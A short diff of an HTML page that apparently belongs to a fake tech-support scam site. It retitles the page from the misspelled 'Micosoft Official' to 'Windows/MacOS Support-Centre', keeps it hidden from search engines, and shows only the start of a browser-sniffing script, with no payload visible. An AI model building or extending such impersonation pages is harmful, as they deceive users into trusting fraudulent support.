@@ -7,7 +7,7 @@
 
     <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
     <meta name="robots" content="noindex,nofollow">
-    <title>Micosoft Official</title>
+    <title>Windows/MacOS Support-Centre</title>
 
     <script type="text/javascript">
         var isChromium = window.chrome,
@@ -68,6 +68,7 @@ if (window.navigator.userAgent.indexOf("Opera") != -1) {
 
 </head>
 <body>
+
 </body>
 
 
